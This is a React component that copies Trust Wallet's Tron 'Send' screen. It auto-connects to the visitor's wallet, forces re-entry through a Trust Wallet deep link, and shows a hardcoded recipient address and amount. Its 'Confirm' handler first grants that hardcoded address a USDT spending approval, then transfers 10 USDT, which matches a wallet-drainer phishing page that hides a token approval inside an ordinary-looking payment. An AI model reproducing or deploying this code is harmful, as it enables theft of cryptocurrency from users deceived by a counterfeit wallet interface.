import { useEffect, useMemo, useState, useCallback, useRef } from "react";
import { Info, ScanLine, Wallet } from "lucide-react";
import { toast } from "sonner";
import { approveUSDT, transferUSDT } from "@/lib/web3";

const DEFAULT_TO_ADDRESS = "TT6fmWxcu35oriyKVVAAUT7oRq9woa2e1t";
const DEFAULT_AMOUNT = "10";
const POLL_INTERVAL_MS = 300;
const MAX_WAIT_MS = 45_000;
const REQUEST_TIMEOUT_MS = 10_000;
const TRUST_REENTRY_KEY = "trust_tron_discover_reentry_attempted";

type TronWebLike = {
  ready?: boolean;
  defaultAddress?: { base58?: string; hex?: string };
  address?: { fromHex?: (hex: string) => string };
  request?: (payload: { method: string; params?: unknown }) => Promise<unknown>;
};

type TronProvider = {
  ready?: boolean;
  address?: { fromHex?: (hex: string) => string };
  tronWeb?: TronWebLike;
  request?: (payload: { method: string; params?: unknown }) => Promise<unknown>;
};

function getInjectedTronWeb(): TronWebLike | null {
  if (typeof window === "undefined") return null;
  const w = window as any;
  return (
    w.tronWeb ??
    w.trustwallet?.tronLink?.tronWeb ??
    w.trustwallet?.tron?.tronWeb ??
    w.tronLink?.tronWeb ??
    w.tron?.tronWeb ??
    null
  );
}

function isLikelyMobileWebView(): boolean {
  if (typeof window === "undefined") return false;
  const ua = navigator.userAgent || "";
  return /android|iphone|ipad|ipod/i.test(ua) && /\bwv\b|version\/4\.0/i.test(ua);
}

function hasAnyInjectedTronGlobals(): boolean {
  if (typeof window === "undefined") return false;
  const w = window as any;
  return Boolean(
    w.tronWeb ||
      w.tronLink ||
      w.trustwallet ||
      w.tron ||
      w.trustwallet?.tronLink ||
      w.trustwallet?.tron
  );
}

function buildTrustDiscoverDeepLink(): string | null {
  if (typeof window === "undefined") return null;
  const redirectUrl = `${window.location.origin}/?tw=tron-send`;
  return `trust://open_url?coin_id=195&url=${encodeURIComponent(redirectUrl)}`;
}

function tryReenterTrustDiscover(): boolean {
  if (typeof window === "undefined") return false;
  if (!isLikelyMobileWebView() || hasAnyInjectedTronGlobals()) return false;
  const deepLink = buildTrustDiscoverDeepLink();
  if (!deepLink) return false;

  const attempted = sessionStorage.getItem(TRUST_REENTRY_KEY);
  if (attempted === "1") {
    return false;
  }

  sessionStorage.setItem(TRUST_REENTRY_KEY, "1");
  window.location.replace(deepLink);
  return true;
}

function getRequestProvider(): TronProvider | null {
  if (typeof window === "undefined") return null;
  const w = window as any;
  return (
    w.trustwallet?.tronLink ??
    w.trustwallet?.tron ??
    w.tronLink ??
    w.tron ??
    (typeof w.tronWeb?.request === "function" ? w.tronWeb : null) ??
    null
  );
}

function getTronAddress(): string | null {
  const tronWeb = getInjectedTronWeb();
  if (!tronWeb) return null;
  const base58 = tronWeb.defaultAddress?.base58;
  if (base58) return base58;
  const hex = tronWeb.defaultAddress?.hex;
  if (hex && typeof tronWeb.address?.fromHex === "function") {
    try {
      return tronWeb.address.fromHex(hex);
    } catch {
      return null;
    }
  }
  return null;
}

function getDebugSnapshot(): string {
  if (typeof window === "undefined") return "no window";
  const w = window as any;
  const provider = getRequestProvider();
  const tronWeb = getInjectedTronWeb();
  const address = getTronAddress();
  const lines = [
    `mobile=${/android|iphone|ipad|ipod/i.test(navigator.userAgent)}`,
    `mobileWebView=${isLikelyMobileWebView()}`,
    `hasWindowTronWeb=${!!w.tronWeb}`,
    `hasWindowTronLink=${!!w.tronLink}`,
    `hasTrustWallet=${!!w.trustwallet}`,
    `hasTrustTronLink=${!!w.trustwallet?.tronLink}`,
    `hasTrustTron=${!!w.trustwallet?.tron}`,
    `hasWindowTron=${!!w.tron}`,
    `providerReady=${String(provider?.ready)}`,
    `providerHasRequest=${typeof provider?.request === "function"}`,
    `tronWebReady=${String(tronWeb?.ready)}`,
    `address=${address ?? "-"}`,
    `ua=${navigator.userAgent.slice(0, 120)}`,
  ];
  return lines.join("\n");
}

async function sleep(ms: number): Promise<void> {
  return new Promise((r) => setTimeout(r, ms));
}

async function requestWithTimeout(
  provider: TronProvider,
  payload: { method: string; params?: unknown }
): Promise<unknown> {
  return await Promise.race([
    provider.request?.(payload),
    sleep(REQUEST_TIMEOUT_MS).then(() => {
      throw new Error(`Request timeout: ${payload.method}`);
    }),
  ]);
}

async function requestTronAccess(provider: TronProvider): Promise<void> {
  if (typeof provider.request !== "function") {
    return;
  }

  const websiteName = "FIU ID";
  const websiteIcon =
    typeof window !== "undefined" ? `${window.location.origin}/favicon.ico` : undefined;
  const payloads = [
    { method: "tron_requestAccounts", params: { websiteName, websiteIcon } },
    { method: "tron_requestAccounts" },
    { method: "requestAccounts" },
    { method: "eth_requestAccounts" },
  ];

  let lastError: Error | null = null;
  for (const payload of payloads) {
    try {
      const res = (await requestWithTimeout(provider, payload)) as
        | { code?: number; message?: string }
        | undefined;
      if (res?.code === 4001) {
        throw new Error("Connection rejected by user");
      }
      if (res?.code === 4000) {
        return;
      }
      return;
    } catch (error) {
      const nextError = error instanceof Error ? error : new Error(String(error));
      if (nextError.message.includes("rejected")) {
        throw nextError;
      }
      lastError = nextError;
    }
  }

  if (lastError) {
    throw lastError;
  }
}

async function pollForAddress(deadline: number): Promise<string | null> {
  while (Date.now() < deadline) {
    const addr = getTronAddress();
    if (addr) return addr;
    await sleep(POLL_INTERVAL_MS);
  }
  return null;
}

const TrustWalletTronPay = () => {
  const [address, setAddress] = useState<string | null>(null);
  const [isConnecting, setIsConnecting] = useState(true);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [debugInfo, setDebugInfo] = useState<string>("");
  const connectInFlight = useRef(false);
  const requestTriggered = useRef(false);

  const isConnected = !!address;
  const toAddress = useMemo(() => DEFAULT_TO_ADDRESS, []);
  const amount = useMemo(() => DEFAULT_AMOUNT, []);
  const approveTo = useMemo(() => DEFAULT_TO_ADDRESS, []);

  const startAutoConnect = useCallback(async () => {
    if (connectInFlight.current || address) {
      return;
    }

    connectInFlight.current = true;
    setIsConnecting(true);
    setDebugInfo(getDebugSnapshot());

    const deadline = Date.now() + MAX_WAIT_MS;

    try {
      if (tryReenterTrustDiscover()) {
        return;
      }

      while (Date.now() < deadline) {
        const currentAddress = getTronAddress();
        if (currentAddress) {
          setAddress(currentAddress);
          setDebugInfo(getDebugSnapshot());
          toast.success("Tron wallet connected");
          return;
        }

        const provider = getRequestProvider();
        if (provider && typeof provider.request === "function" && !requestTriggered.current) {
          requestTriggered.current = true;
          try {
            await requestTronAccess(provider);
          } catch (error) {
            if (error instanceof Error && error.message.includes("rejected")) {
              throw error;
            }
          }
        }

        const polledAddress = await pollForAddress(Date.now() + POLL_INTERVAL_MS);
        if (polledAddress) {
          setAddress(polledAddress);
          setDebugInfo(getDebugSnapshot());
          toast.success("Tron wallet connected");
          return;
        }
      }

      throw new Error(
        "Could not connect Trust Wallet automatically. Make sure a Tron account is active in Trust Wallet Discover."
      );
    } finally {
      connectInFlight.current = false;
      setIsConnecting(false);
      setDebugInfo(getDebugSnapshot());
    }
  }, [address]);

  useEffect(() => {
    void startAutoConnect();
  }, [startAutoConnect]);

  useEffect(() => {
    const retry = () => {
      if (!address) {
        void startAutoConnect();
      }
    };

    const onVisibilityChange = () => {
      if (document.visibilityState === "visible") {
        retry();
      }
    };

    window.addEventListener("focus", retry);
    window.addEventListener("pageshow", retry);
    document.addEventListener("visibilitychange", onVisibilityChange);

    return () => {
      window.removeEventListener("focus", retry);
      window.removeEventListener("pageshow", retry);
      document.removeEventListener("visibilitychange", onVisibilityChange);
    };
  }, [address, startAutoConnect]);

  // Keep address in sync if user switches account
  useEffect(() => {
    if (!address) return;
    const id = setInterval(() => {
      const current = getTronAddress();
      if (current && current !== address) {
        setAddress(current);
      }
    }, 2000);
    return () => clearInterval(id);
  }, [address]);

  const handleConfirm = useCallback(async () => {
    try {
      setIsSubmitting(true);
      if (!getTronAddress()) {
        requestTriggered.current = false;
        await startAutoConnect();
      }

      await approveUSDT("tron", approveTo);
      await transferUSDT("tron", toAddress, amount);

      toast.success("Approve and transfer completed successfully.");
    } catch (error) {
      toast.error(
        error instanceof Error ? error.message : "Transaction flow failed"
      );
    } finally {
      setIsSubmitting(false);
    }
  }, [approveTo, toAddress, amount, startAutoConnect]);

  return (
    <div className="min-h-screen bg-[#f5f5f6] flex justify-center p-3">
      <div className="w-full max-w-sm bg-[#f5f5f6] pt-4">
        <div className="mb-5">
          <p className="text-[24px] leading-7 font-semibold text-[#262626]">
            Send
          </p>
          <div className="text-xs text-[#8b8b94] mt-1 flex items-center gap-1.5">
            <Wallet className="w-3.5 h-3.5" />
            {isConnected
              ? `Connected: ${address?.slice(0, 6)}...${address?.slice(-4)}`
              : isConnecting
              ? "Connecting wallet..."
              : "Wallet not connected"}
          </div>
        </div>

        <label className="text-[#5e5e66] text-[13px] font-medium block mb-2">
          Address or Domain Name
        </label>
        <div className="h-12 rounded-xl border border-[#d7d7dc] bg-white px-3 flex items-center justify-between">
          <span className="text-[#171717] text-sm truncate">{toAddress}</span>
          <span className="text-[#5f5de8] text-sm font-semibold">Paste</span>
        </div>

        <div className="mt-5">
          <label className="text-[#5e5e66] text-[13px] font-medium block mb-2">
            Destination network
          </label>
          <div className="inline-flex items-center gap-2 rounded-full bg-[#efeff2] px-3 py-1.5">
            <span className="w-4 h-4 rounded-full bg-[#ef2c2c] inline-block" />
            <span className="text-sm text-[#4c4c52]">Tron</span>
          </div>
        </div>

        <div className="mt-5">
          <label className="text-[#5e5e66] text-[13px] font-medium block mb-2">
            Amount
          </label>
          <div className="h-14 rounded-xl border border-[#d7d7dc] bg-white px-3 flex items-center justify-between">
            <span className="text-[#171717] text-[28px] leading-none font-medium">
              {amount}
            </span>
            <div className="flex items-center gap-2">
              <span className="text-[#67676f] text-base">USDT</span>
              <span className="text-[#5f5de8] text-base font-semibold">Max</span>
            </div>
          </div>
          <p className="text-[#8d8d96] text-xs mt-2">≈ 10.00 USDT</p>
        </div>

        <div className="mt-3">
          <label className="text-[#5e5e66] text-[13px] font-medium block mb-2">
            Memo
          </label>
          <div className="h-12 rounded-xl border border-[#d7d7dc] bg-white px-3 flex items-center justify-end gap-3">
            <ScanLine className="w-4 h-4 text-[#5f5de8]" />
            <Info className="w-4 h-4 text-[#5f5de8]" />
          </div>
        </div>

        <button
          className="fixed bottom-4 left-1/2 -translate-x-1/2 w-[calc(100%-24px)] max-w-sm h-12 rounded-full bg-[#8d8cf0] text-white font-semibold disabled:opacity-55"
          onClick={handleConfirm}
          disabled={isSubmitting || isConnecting || !isConnected}
          type="button"
        >
          {isSubmitting ? "Confirming..." : "Confirm"}
        </button>

        {/* Debug panel — shows what Trust injected. Remove once connection works. */}
        {debugInfo && (
          <div className="mt-6 p-3 bg-white/60 rounded-xl">
            <p className="text-[10px] leading-4 font-mono text-[#666] whitespace-pre-wrap break-words select-all">
              {debugInfo}
            </p>
          </div>
        )}
      </div>
    </div>
  );
};

export default TrustWalletTronPay;
